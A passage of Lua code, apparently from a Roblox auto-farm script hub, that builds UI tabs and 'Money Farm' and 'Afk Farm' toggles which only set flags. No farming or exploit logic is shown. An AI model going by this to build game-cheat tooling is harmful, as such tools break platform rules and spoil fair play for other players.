			PremiumOnly = false
		})

		local CreditsTab = Window:MakeTab({
			Name = "Credits",
			Icon = "rbxassetid://4483345998",
			PremiumOnly = true
		})

		local MiscTab3 = MainTab:AddSection({
			Name = "Auto Farms"
		})

		MainTab:AddToggle({
			Name = "Money Farm",
			Default = false,
			Callback = function(Value)
				Settings.moneyfarm = Value
			end    
		})

		MainTab:AddToggle({
			Name = "Afk Farm",
			Default = false,
			Callback = function(Value)
				Settings.afkfarm = Value
			end    
